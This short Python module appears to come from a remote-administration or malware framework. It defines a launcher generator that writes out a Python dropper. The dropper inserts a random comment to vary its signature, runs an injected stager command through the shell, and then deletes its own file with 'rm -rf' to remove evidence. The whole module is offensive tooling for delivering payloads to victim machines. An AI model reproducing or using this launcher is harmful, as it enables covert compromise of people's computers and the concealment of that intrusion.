from launchers.helpers import *


class Launcher(LauncherABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Creates a python file launcher.",
            "References": [],
        }

    def generate(self, stager: str):
        return ("py", """\
        #!/usr/bin/env python
        # -*- coding: utf-8 -*-
        # {}
        import subprocess

        subprocess.Popen("{}", shell=True)
        subprocess.Popen("rm -rf " + __file__, shell=True)
        """.format(random_string(numbers=True), stager.replace('"', '\\"')))
